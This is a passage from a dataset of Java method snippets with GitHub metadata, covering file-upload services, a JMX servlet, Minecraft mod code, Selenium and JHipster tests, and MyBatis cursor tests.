"return_type": "void", "snippet": "    public static void main(String[] args) {        Gift gift = new Gift(\"\u5916\u661f\u4eba\uff08alienware\uff09\u5168\u65b0Aurora R9\");        GiftExchange giftExchange = new GiftExchange();        giftExchange.giftExchange(gift);    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/structural/facade/GiftExchangeTest.java", "stars": "2", "class": {"name": "GiftExchangeTest", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getSpriteForSide", "params": ["Direction", "BlockRenderView", "BlockState", "BlockPos", "Random"], "throws": null, "modifiers": ["public"], "return_type": "Sprite", "snippet": "\tpublic Sprite getSpriteForSide(Direction side, BlockRenderView view, BlockState state, BlockPos pos, Random random) {\t\tboolean left = testLeft(view, side, pos, state);\t\tboolean right = testRight(view, side, pos, state);\t\tboolean down = testDown(view, side, pos, state);\t\tboolean up = testUp(view, side, pos, state);\t\tif(down && up) {\t\t\treturn connects[1];\t\t} else if(down && !up) {\t\t\treturn connects[2];\t\t} else if(!down && up) {\t\t\treturn connects[0];\t\t} else if(left && right) {\t\t\treturn connects[5];\t\t} else if(left && !right) {\t\t\treturn connects[6];\t\t} else if(!left && right) {\t\t\treturn connects[4];\t\t} else {\t\t\treturn connects[3];\t\t}\t}", "url": "https://raw.githubusercontent.com/Nuclearfarts/connected-block-textures/master/src/main/java/io/github/nuclearfarts/cbt/model/VerticalHorizontalCTMSpriteProvider.java", "stars": "3", "class": {"name": "VerticalHorizontalCTMSpriteProvider", "extends": "ConnectingSpriteProvider", "implements": null, "modifiers": ["public"]}}, {"method_name": "init", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void init() {    try {      Files.createDirectory(root);    } catch (IOException e) {      throw new RuntimeException(\"Could not initialize folder for upload!\");    }  }", "url": "https://raw.githubusercontent.com/bezkoder/spring-boot-upload-multiple-files/master/src/main/java/com/bezkoder/spring/files/uploadmultiple/service/FilesStorageServiceImpl.java", "stars": "2", "class": {"name": "FilesStorageServiceImpl", "extends": null, "implements": ["FilesStorageService"], "modifiers": ["public"]}}, {"method_name": "save", "params": ["MultipartFile"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void save(MultipartFile file) {    try {      Files.copy(file.getInputStream(), this.root.resolve(file.getOriginalFilename()));    } catch (Exception e) {      throw new RuntimeException(\"Could not store the file. Error: \" + e.getMessage());    }  }", "url": "https://raw.githubusercontent.com/bezkoder/spring-boot-upload-multiple-files/master/src/main/java/com/bezkoder/spring/files/uploadmultiple/service/FilesStorageServiceImpl.java", "stars": "2", "class": {"name": "FilesStorageServiceImpl", "extends": null, "implements": ["FilesStorageService"], "modifiers": ["public"]}}, {"method_name": "load", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Resource", "snippet": "  public Resource load(String filename) {    try {      Path file = root.resolve(filename);      Resource resource = new UrlResource(file.toUri());      if (resource.exists() || resource.isReadable()) {        return resource;      } else {        throw new RuntimeException(\"Could not read the file!\");      }    } catch (MalformedURLException e) {      throw new RuntimeException(\"Error: \" + e.getMessage());    }  }", "url": "https://raw.githubusercontent.com/bezkoder/spring-boot-upload-multiple-files/master/src/main/java/com/bezkoder/spring/files/uploadmultiple/service/FilesStorageServiceImpl.java", "stars": "2", "class": {"name": "FilesStorageServiceImpl", "extends": null, "implements": ["FilesStorageService"], "modifiers": ["public"]}}, {"method_name": "deleteAll", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void deleteAll() {    FileSystemUtils.deleteRecursively(root.toFile());  }", "url": "https://raw.githubusercontent.com/bezkoder/spring-boot-upload-multiple-files/master/src/main/java/com/bezkoder/spring/files/uploadmultiple/service/FilesStorageServiceImpl.java", "stars": "2", "class": {"name": "FilesStorageServiceImpl", "extends": null, "implements": ["FilesStorageService"], "modifiers": ["public"]}}, {"method_name": "loadAll", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Stream<Path>", "snippet": "  public Stream<Path> loadAll() {    try {      return Files.walk(this.root, 1).filter(path -> !path.equals(this.root)).map(this.root::relativize);    } catch (IOException e) {      throw new RuntimeException(\"Could not load the files!\");    }  }", "url": "https://raw.githubusercontent.com/bezkoder/spring-boot-upload-multiple-files/master/src/main/java/com/bezkoder/spring/files/uploadmultiple/service/FilesStorageServiceImpl.java", "stars": "2", "class": {"name": "FilesStorageServiceImpl", "extends": null, "implements": ["FilesStorageService"], "modifiers": ["public"]}}, {"method_name": "initElements", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void initElements() {\t\telements.blocks.add(() -> new CustomBlock());\t\telements.items\t\t\t\t.add(() -> new BlockItem(block, new Item.Properties().group(ItemGroup.BUILDING_BLOCKS)).setRegistryName(block.getRegistryName()));\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/MudBricksBlock.java", "stars": "2", "class": {"name": "MudBricksBlock", "extends": "EnhancedVanillaElements", "implements": null, "modifiers": ["public"]}}, {"method_name": "getDrops", "params": ["BlockState", "LootContext"], "throws": null, "modifiers": ["public"], "return_type": "List<ItemStack>", "snippet": "\t\tpublic List<ItemStack> getDrops(BlockState state, LootContext.Builder builder) {\t\t\tList<ItemStack> dropsOriginal = super.getDrops(state, builder);\t\t\tif (!dropsOriginal.isEmpty())\t\t\t\treturn dropsOriginal;\t\t\treturn Collections.singletonList(new ItemStack(this, 0));\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/MudBricksBlock.java", "stars": "2", "class": {"name": "CustomBlock", "extends": "Block", "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "init", "params": ["ServletConfig"], "throws": ["ServletException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void init(final ServletConfig config) throws ServletException {    super.init(config);    this.server = (AzkabanWebServer) getApplication();    this.executorManagerAdapter = this.server.getExecutorManager();    this.triggerManager = this.server.getTriggerManager();  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/servlet/JMXHttpServlet.java", "stars": "18", "class": {"name": "JMXHttpServlet", "extends": "LoginAbstractAzkabanServlet", "implements": ["ConnectorParams"], "modifiers": ["public"]}}, {"method_name": "handleGet", "params": ["HttpServletRequest", "HttpServletResponse", "Session"], "throws": ["ServletException", "IOException"], "modifiers": ["protected"], "return_type": "void", "snippet": "  protected void handleGet(final HttpServletRequest req, final HttpServletResponse resp,                           final Session session) throws ServletException, IOException {    if (hasParam(req, \"ajax\")) {      Map<String, Object> ret = new HashMap<>();      final String ajax = getParam(req, \"ajax\");      if (JMX_GET_ALL_EXECUTOR_ATTRIBUTES.equals(ajax)) {        if (!hasParam(req, JMX_MBEAN) || !hasParam(req, JMX_HOSTPORT)) {          ret.put(\"error\", \"Parameters '\" + JMX_MBEAN + \"' and '\"              + JMX_HOSTPORT + \"' must be set\");          this.writeJSON(resp, ret, true);          return;        }        final String hostPort = getParam(req, JMX_HOSTPORT);        final String mbean = getParam(req, JMX_MBEAN);        final Map<String, Object> result =                this.executorManagerAdapter.callExecutorJMX(hostPort, JMX_GET_ALL_MBEAN_ATTRIBUTES, mbean);        // order the attribute by name        for (final Map.Entry<String, Object> entry : result.entrySet()) {          if (entry.getValue() instanceof Map) {            final Map<String, Object> entryValue = (Map<String, Object>) entry.getValue();            result.put(entry.getKey(), new TreeMap<>(entryValue));          }        }        ret = result;      } else if (JMX_GET_MBEANS.equals(ajax)) {        ret.put(\"mbeans\", this.server.getMbeanNames());      } else if (JMX_GET_MBEAN_INFO.equals(ajax)) {        if (hasParam(req, JMX_MBEAN)) {          final String mbeanName = getParam(req, JMX_MBEAN);          try {            final ObjectName name = new ObjectName(mbeanName);            final MBeanInfo info = this.server.getMBeanInfo(name);            ret.put(\"attributes\", info.getAttributes());            ret.put(\"description\", info.getDescription());          } catch (final Exception e) {            logger.error(e);            ret.put(\"error\", \"'\" + mbeanName + \"' is not a valid mBean name\");          }        } else {          ret.put(\"error\", \"No 'mbean' name parameter specified\");        }      } else if (JMX_GET_MBEAN_ATTRIBUTE.equals(ajax)) {        if (!hasParam(req, JMX_MBEAN) || !hasParam(req, JMX_ATTRIBUTE)) {          ret.put(\"error\", \"Parameters 'mbean' and 'attribute' must be set\");        } else {          final String mbeanName = getParam(req, JMX_MBEAN);          final String attribute = getParam(req, JMX_ATTRIBUTE);          try {            final ObjectName name = new ObjectName(mbeanName);            final Object obj = this.server.getMBeanAttribute(name, attribute);            ret.put(\"value\", obj);          } catch (final Exception e) {            logger.error(e);            ret.put(\"error\", \"'\" + mbeanName + \"' is not a valid mBean name\");          }        }      } else if (JMX_GET_ALL_MBEAN_ATTRIBUTES.equals(ajax)) {        if (!hasParam(req, JMX_MBEAN)) {          ret.put(\"error\", \"Parameters 'mbean' must be set\");        } else {          final String mbeanName = getParam(req, JMX_MBEAN);          try {            final ObjectName name = new ObjectName(mbeanName);            final MBeanInfo info = this.server.getMBeanInfo(name);            final MBeanAttributeInfo[] mbeanAttrs = info.getAttributes();            final Map<String, Object> attributes = new TreeMap<>();            for (final MBeanAttributeInfo attrInfo : mbeanAttrs) {              final Object obj = this.server.getMBeanAttribute(name, attrInfo.getName());              attributes.put(attrInfo.getName(), obj);            }            ret.put(\"attributes\", attributes);          } catch (final Exception e) {            logger.error(e);            ret.put(\"error\", \"'\" + mbeanName + \"' is not a valid mBean name\");          }        }      } else {        ret.put(\"commands\", new String[]{            JMX_GET_MBEANS,            JMX_GET_MBEAN_INFO + \"&\" + JMX_MBEAN + \"=<name>\",            JMX_GET_MBEAN_ATTRIBUTE + \"&\" + JMX_MBEAN + \"=<name>&\"                + JMX_ATTRIBUTE + \"=<attributename>\"});      }      this.writeJSON(resp, ret, true);    } else {      handleJMXPage(req, resp, session);    }  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/servlet/JMXHttpServlet.java", "stars": "18", "class": {"name": "JMXHttpServlet", "extends": "LoginAbstractAzkabanServlet", "implements": ["ConnectorParams"], "modifiers": ["public"]}}, {"method_name": "handleJMXPage", "params": ["HttpServletRequest", "HttpServletResponse", "Session"], "throws": ["IOException"], "modifiers": ["private"], "return_type": "void", "snippet": "  private void handleJMXPage(final HttpServletRequest req, final HttpServletResponse resp,      final Session session) throws IOException {    final Page page =        newPage(req, resp, session,            \"azkaban/webapp/servlet/velocity/jmxpage.vm\");    Map<String, String> subPageMap1 = new HashMap<>();    String languageType = LoadJsonUtils.getLanguageType();    if (languageType.equalsIgnoreCase(\"zh_CN\")) {      subPageMap1 = LoadJsonUtils.transJson(\"/com.webank.wedatasphere.schedulis.i18n.conf/azkaban-web-server-zh_CN.json\",              \"azkaban.webapp.servlet.velocity.nav.vm\");    } else {      subPageMap1 = LoadJsonUtils.transJson(\"/com.webank.wedatasphere.schedulis.i18n.conf/azkaban-web-server-en_US.json\",              \"azkaban.webapp.servlet.velocity.nav.vm\");    }    subPageMap1.forEach(page::add);    page.add(\"mbeans\", this.server.getMbeanNames());    page.add(\"currentlangType\", languageType);    final Map<String, Object> executorMBeans = new HashMap<>();    for (final String hostPort : this.executorManagerAdapter.getAllActiveExecutorServerHosts()) {      try {        final Map<String, Object> mbeans =            this.executorManagerAdapter.callExecutorJMX(hostPort, JMX_GET_MBEANS, null);        executorMBeans.put(hostPort, mbeans.get(\"mbeans\"));      } catch (final IOException e) {        logger.error(\"Cannot contact executor \" + hostPort, e);      }    }    page.add(\"executorRemoteMBeans\", executorMBeans);    final Map<String, Object> triggerserverMBeans = new HashMap<>();    triggerserverMBeans.put(this.triggerManager.getJMX().getPrimaryServerHost(),        this.triggerManager.getJMX().getAllJMXMbeans());    page.add(\"triggerserverRemoteMBeans\", triggerserverMBeans);    page.render();  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/servlet/JMXHttpServlet.java", "stars": "18", "class": {"name": "JMXHttpServlet", "extends": "LoginAbstractAzkabanServlet", "implements": ["ConnectorParams"], "modifiers": ["public"]}}, {"method_name": "handlePost", "params": ["HttpServletRequest", "HttpServletResponse", "Session"], "throws": ["ServletException", "IOException"], "modifiers": ["protected"], "return_type": "void", "snippet": "  protected void handlePost(final HttpServletRequest req, final HttpServletResponse resp,      final Session session) throws ServletException, IOException {  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-web-server/src/main/java/azkaban/webapp/servlet/JMXHttpServlet.java", "stars": "18", "class": {"name": "JMXHttpServlet", "extends": "LoginAbstractAzkabanServlet", "implements": ["ConnectorParams"], "modifiers": ["public"]}}, {"method_name": "main", "params": ["String"], "throws": ["InterruptedException"], "modifiers": ["public", "static"], "return_type": "void", "snippet": "public static void main(String[] args) throws InterruptedException {\t\t\t\t/* UnhandledAlertException: Modal dialog present\t\t * \t\t * Alert alert=driver.switchTo().alert();\t\t * \t\t * \talert.accept();\t\t * \talert.dismiss();\t\t * \talert.getText();\t\t * \talert.sendKeys();\t\t */\t\t\t\t/* TC 1: JavaScript alert text verification\t\t1. Open chrome browser\t\t2. Go to \u201chttp://jiravm.centralus.cloudapp.azure.com:8081/index.html\u201d\t\t3. Click on \u201cAlerts & Modals\u201d links\t\t4. Click on \u201cJavascript Alerts\u201d links\t\t5. Click on button in \u201cJava Script Alert Box\u201d section\t\t6. Verify alert box with text \u201cI am an alert box!\u201d is present\t\t7. Click on button in \u201cJava Script Confirm Box\u201d section\t\t8. Verify alert box with text \u201cPress a button!\u201d is present\t\t9. Click on button in \u201cJava Script Alert Box\u201d section\t\t10. Enter text in the alert box\t\t11. Quit browser */\t\t// From Mr. Hasan's Common Methods (IMPORTANT. Common Methods class is in utils package!!!)\t\tsetUp(\"chrome\", SELENIUM_TEST);\t\t\t\tdriver.findElement(By.linkText(\"Alerts & Modals\")).click();\t\tdriver.findElement(By.linkText(\"Javascript Alerts\")).click();\t\t\t\tThread.sleep(3000);\t\tdriver.findElement(By.xpath(\"//button[text()='Click for Prompt Box']\")).click();\t\tThread.sleep(1000);\t\t\t\tAlert alert=driver.switchTo().alert();\t\tString alertBoxText=alert.getText();\t\t\t\tSystem.out.println(alertBoxText);\t\t\t\tString name=\"John Smith\";\t\talert.sendKeys(name);\t\t\t\talert.accept();\t\t\t\tWebElement promptMsg=driver.findElement(By.id(\"prompt-demo\"));\t\t\t\tString msg=promptMsg.getText();\t\t\t\tif(msg.contains(name)) {\t\t\tSystem.out.println(\"Test PASS\");\t\t}else {\t\t\tSystem.out.println(\"Test FAIL\");\t\t}\t\t\t\tThread.sleep(3000);\t\tdriver.quit();\t\t\t}", "url": "https://raw.githubusercontent.com/fadimedibi/SeleniumTurkish/master/src/com/class5/AlertPopUpsRecap.java", "stars": "3", "class": {"name": "AlertPopUpsRecap", "extends": "CommonMethods", "implements": null, "modifiers": ["public"]}}, {"method_name": "of", "params": ["int"], "throws": null, "modifiers": ["public", "static"], "return_type": "Term<Integer>", "snippet": "    public static Term<Integer> of(int value) {        return Term.pure(Type.INT, value);    }", "url": "https://raw.githubusercontent.com/sstewartgallus/jsystemf/master/src/com/sstewartgallus/term/Prims.java", "stars": "5", "class": {"name": "Prims", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "add", "params": ["Term<Integer>", "Term<Integer>"], "throws": null, "modifiers": ["public", "static"], "return_type": "Term<Integer>", "snippet": "    public static Term<Integer> add(Term<Integer> left, Term<Integer> right) {        throw new UnsupportedOperationException(\"unimplemented\");    }", "url": "https://raw.githubusercontent.com/sstewartgallus/jsystemf/master/src/com/sstewartgallus/term/Prims.java", "stars": "5", "class": {"name": "Prims", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "lessThan", "params": ["Term<Integer>", "Term<Integer>"], "throws": null, "modifiers": ["public", "static"], "return_type": "Term<Boolean>", "snippet": "    public static Term<Boolean> lessThan(Term<Integer> left, Term<Integer> right) {        throw new UnsupportedOperationException(\"unimplemented\");    }", "url": "https://raw.githubusercontent.com/sstewartgallus/jsystemf/master/src/com/sstewartgallus/term/Prims.java", "stars": "5", "class": {"name": "Prims", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "getName", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getName() {        return name;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/OptionsDomain.java", "stars": "2", "class": {"name": "OptionsDomain", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setName", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setName(String name) {        this.name = name;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/OptionsDomain.java", "stars": "2", "class": {"name": "OptionsDomain", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getValue", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getValue() {        return value;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/OptionsDomain.java", "stars": "2", "class": {"name": "OptionsDomain", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setValue", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setValue(String value) {        this.value = value;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/OptionsDomain.java", "stars": "2", "class": {"name": "OptionsDomain", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getDescription", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getDescription() {        return description;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/OptionsDomain.java", "stars": "2", "class": {"name": "OptionsDomain", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setDescription", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setDescription(String description) {        this.description = description;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/OptionsDomain.java", "stars": "2", "class": {"name": "OptionsDomain", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "monodroidAddReference", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidAddReference (java.lang.Object obj)\t{\t\tif (refList == null)\t\t\trefList = new java.util.ArrayList ();\t\trefList.add (obj);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/EntryEditText.java", "stars": "2", "class": {"name": "EntryEditText", "extends": "crc643f46942d9dd1fff9", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "monodroidClearReferences", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidClearReferences ()\t{\t\tif (refList != null)\t\t\trefList.clear ();\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/EntryEditText.java", "stars": "2", "class": {"name": "EntryEditText", "extends": "crc643f46942d9dd1fff9", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "initTest", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void initTest() {        auditEventRepository.deleteAll();        auditEvent = new PersistentAuditEvent();        auditEvent.setAuditEventType(SAMPLE_TYPE);        auditEvent.setPrincipal(SAMPLE_PRINCIPAL);        auditEvent.setAuditEventDate(SAMPLE_TIMESTAMP);    }", "url": "https://raw.githubusercontent.com/Vondser/mmwms-antd/master/src/test/java/com/meimos/myapp/web/rest/AuditResourceIT.java", "stars": "2", "class": {"name": "AuditResourceIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getAllAudits", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void getAllAudits() throws Exception {        // Initialize the database        auditEventRepository.save(auditEvent);        // Get all the audits        restAuditMockMvc            .perform(get(\"/management/audits\"))            .andExpect(status().isOk())            .andExpect(content().contentType(MediaType.APPLICATION_JSON_VALUE))            .andExpect(jsonPath(\"$.[*].principal\").value(hasItem(SAMPLE_PRINCIPAL)));    }", "url": "https://raw.githubusercontent.com/Vondser/mmwms-antd/master/src/test/java/com/meimos/myapp/web/rest/AuditResourceIT.java", "stars": "2", "class": {"name": "AuditResourceIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getAudit", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void getAudit() throws Exception {        // Initialize the database        auditEventRepository.save(auditEvent);        // Get the audit        restAuditMockMvc            .perform(get(\"/management/audits/{id}\", auditEvent.getId()))            .andExpect(status().isOk())            .andExpect(content().contentType(MediaType.APPLICATION_JSON_VALUE))            .andExpect(jsonPath(\"$.principal\").value(SAMPLE_PRINCIPAL));    }", "url": "https://raw.githubusercontent.com/Vondser/mmwms-antd/master/src/test/java/com/meimos/myapp/web/rest/AuditResourceIT.java", "stars": "2", "class": {"name": "AuditResourceIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getAuditsByDate", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void getAuditsByDate() throws Exception {        // Initialize the database        auditEventRepository.save(auditEvent);        // Generate dates for selecting audits by date, making sure the period will contain the audit        String fromDate = SAMPLE_TIMESTAMP.minusSeconds(SECONDS_PER_DAY).toString().substring(0, 10);        String toDate = SAMPLE_TIMESTAMP.plusSeconds(SECONDS_PER_DAY).toString().substring(0, 10);        // Get the audit        restAuditMockMvc            .perform(get(\"/management/audits?fromDate=\" + fromDate + \"&toDate=\" + toDate))            .andExpect(status().isOk())            .andExpect(content().contentType(MediaType.APPLICATION_JSON_VALUE))            .andExpect(jsonPath(\"$.[*].principal\").value(hasItem(SAMPLE_PRINCIPAL)));    }", "url": "https://raw.githubusercontent.com/Vondser/mmwms-antd/master/src/test/java/com/meimos/myapp/web/rest/AuditResourceIT.java", "stars": "2", "class": {"name": "AuditResourceIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getNonExistingAuditsByDate", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void getNonExistingAuditsByDate() throws Exception {        // Initialize the database        auditEventRepository.save(auditEvent);        // Generate dates for selecting audits by date, making sure the period will not contain the sample audit        String fromDate = SAMPLE_TIMESTAMP.minusSeconds(2 * SECONDS_PER_DAY).toString().substring(0, 10);        String toDate = SAMPLE_TIMESTAMP.minusSeconds(SECONDS_PER_DAY).toString().substring(0, 10);        // Query audits but expect no results        restAuditMockMvc            .perform(get(\"/management/audits?fromDate=\" + fromDate + \"&toDate=\" + toDate))            .andExpect(status().isOk())            .andExpect(content().contentType(MediaType.APPLICATION_JSON_VALUE))            .andExpect(header().string(\"X-Total-Count\", \"0\"));    }", "url": "https://raw.githubusercontent.com/Vondser/mmwms-antd/master/src/test/java/com/meimos/myapp/web/rest/AuditResourceIT.java", "stars": "2", "class": {"name": "AuditResourceIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getNonExistingAudit", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void getNonExistingAudit() throws Exception {        // Get the audit        restAuditMockMvc.perform(get(\"/management/audits/{id}\", Long.MAX_VALUE)).andExpect(status().isNotFound());    }", "url": "https://raw.githubusercontent.com/Vondser/mmwms-antd/master/src/test/java/com/meimos/myapp/web/rest/AuditResourceIT.java", "stars": "2", "class": {"name": "AuditResourceIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "testPersistentAuditEventEquals", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void testPersistentAuditEventEquals() throws Exception {        TestUtil.equalsVerifier(PersistentAuditEvent.class);        PersistentAuditEvent auditEvent1 = new PersistentAuditEvent();        auditEvent1.setId(1L);        PersistentAuditEvent auditEvent2 = new PersistentAuditEvent();        auditEvent2.setId(auditEvent1.getId());        assertThat(auditEvent1).isEqualTo(auditEvent2);        auditEvent2.setId(2L);        assertThat(auditEvent1).isNotEqualTo(auditEvent2);        auditEvent1.setId(null);        assertThat(auditEvent1).isNotEqualTo(auditEvent2);    }", "url": "https://raw.githubusercontent.com/Vondser/mmwms-antd/master/src/test/java/com/meimos/myapp/web/rest/AuditResourceIT.java", "stars": "2", "class": {"name": "AuditResourceIT", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setUp", "params": [], "throws": ["Exception"], "modifiers": ["static"], "return_type": "void", "snippet": "  static void setUp() throws Exception {    // create a SqlSessionFactory    try (Reader reader = Resources.getResourceAsReader(\"org/apache/ibatis/submitted/cursor_nested/mybatis-config.xml\")) {      sqlSessionFactory = new SqlSessionFactoryBuilder().build(reader);    }    // populate in-memory database    BaseDataTest.runScript(sqlSessionFactory.getConfiguration().getEnvironment().getDataSource(),        \"org/apache/ibatis/submitted/cursor_nested/CreateDB.sql\");  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/cursor_nested/CursorNestedTest.java", "stars": "15", "class": {"name": "CursorNestedTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "shouldGetAllUser", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void shouldGetAllUser() {    Cursor<User> usersCursor;    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {      Mapper mapper = sqlSession.getMapper(Mapper.class);      usersCursor = mapper.getAllUsers();      Assertions.assertFalse(usersCursor.isOpen());      // Retrieving iterator, fetching is not started      Iterator<User> iterator = usersCursor.iterator();      // Check if hasNext, fetching is started      Assertions.assertTrue(iterator.hasNext());      Assertions.assertTrue(usersCursor.isOpen());      Assertions.assertFalse(usersCursor.isConsumed());      User user = iterator.next();      Assertions.assertEquals(2, user.getGroups().size());      Assertions.assertEquals(3, user.getRoles().size());      user = iterator.next();      Assertions.assertEquals(1, user.getGroups().size());      Assertions.assertEquals(3, user.getRoles().size());      user = iterator.next();      Assertions.assertEquals(3, user.getGroups().size());      Assertions.assertEquals(1, user.getRoles().size());      user = iterator.next();      Assertions.assertEquals(2, user.getGroups().size());      Assertions.assertEquals(2, user.getRoles().size());      Assertions.assertTrue(usersCursor.isOpen());      Assertions.assertFalse(usersCursor.isConsumed());      // Check no more elements      Assertions.assertFalse(iterator.hasNext());      Assertions.assertFalse(usersCursor.isOpen());      Assertions.assertTrue(usersCursor.isConsumed());    }    Assertions.assertFalse(usersCursor.isOpen());  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/cursor_nested/CursorNestedTest.java", "stars": "15", "class": {"name": "CursorNestedTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testCursorWithRowBound", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void testCursorWithRowBound() {    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {      Cursor<User> usersCursor = sqlSession.selectCursor(\"getAllUsers\", null, new RowBounds(2, 1));      Iterator<User> iterator = usersCursor.iterator();      Assertions.assertTrue(iterator.hasNext());      User user = iterator.next();      Assertions.assertEquals(\"User3\", user.getName());      Assertions.assertEquals(2, usersCursor.getCurrentIndex());      Assertions.assertFalse(iterator.hasNext());      Assertions.assertFalse(usersCursor.isOpen());      Assertions.assertTrue(usersCursor.isConsumed());    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/cursor_nested/CursorNestedTest.java", "stars": "15", "class": {"name": "CursorNestedTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "dispose", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void dispose() {    }", "url": "https://raw.githubusercontent.com/billsonnn/nitro-java/master/application/src/main/java/com/nitro/application/communication/messages/outgoing/client/ClientPingComposer.java", "stars": "2", "class": {"name": "ClientPingComposer", "extends": null, "implements": ["IMessageComposer"], "modifiers": ["public"]}}, {"method_name": "getMessageArray", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Object", "snippet": "    public Object[] getMessageArray() {        return this.data.toArray();    }", "url": "https://raw.githubusercontent.com/billsonnn/nitro-java/master/application/src/main/java/com/nitro/application/communication/messages/outgoing/client/ClientPingComposer.java", "stars": "2", "class": {"name": "ClientPingComposer", "extends": null, "implements": ["IMessageComposer"], "modifiers": ["public"]}}, {"method_name": "preTrackingEventMethod", "params": [], "throws": null, "modifiers": ["synchronized", "protected"], "return_type": "void", "snippet": "  protected synchronized void preTrackingEventMethod() {    this.value = this.flowManager.getNumQueuedFlows();  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/metric/NumQueuedFlowMetric.java", "stars": "18", "class": {"name": "NumQueuedFlowMetric", "extends": "TimeBasedReportingMetric", "implements": null, "modifiers": ["public"]}}, {"method_name": "postTrackingEventMethod", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "  protected void postTrackingEventMethod() {    // nothing to post process  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/metric/NumQueuedFlowMetric.java", "stars": "18", "class": {"name": "NumQueuedFlowMetric", "extends": "TimeBasedReportingMetric", "implements": null, "modifiers": ["public"]}}, {"method_name": "getNote", "params": ["String", 